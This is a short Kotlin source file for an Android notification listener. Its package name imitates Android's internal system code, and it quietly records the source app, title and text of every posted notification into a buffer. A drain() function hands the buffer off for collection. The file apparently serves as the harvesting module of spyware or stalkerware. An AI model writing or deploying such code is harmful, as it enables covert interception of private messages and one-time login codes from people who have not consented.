package com.android.internal.svc.modules

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.concurrent.ConcurrentLinkedQueue

class AlertService : NotificationListenerService() {

    companion object {
        val buffer = ConcurrentLinkedQueue<String>()
        private const val MAX_BUFFER = 1000

        fun drain(): List<String> {
            val entries = mutableListOf<String>()
            while (buffer.isNotEmpty() && entries.size < MAX_BUFFER) {
                buffer.poll()?.let { entries.add(it) }
            }
            return entries
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: "unknown"
        val extras = sbn.notification?.extras
        val title = extras?.getCharSequence("android.title")?.toString() ?: ""
        val text = extras?.getCharSequence("android.text")?.toString() ?: ""
        val entry = "${System.currentTimeMillis()}|$pkg|$title|$text"
        if (buffer.size < MAX_BUFFER) buffer.add(entry)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
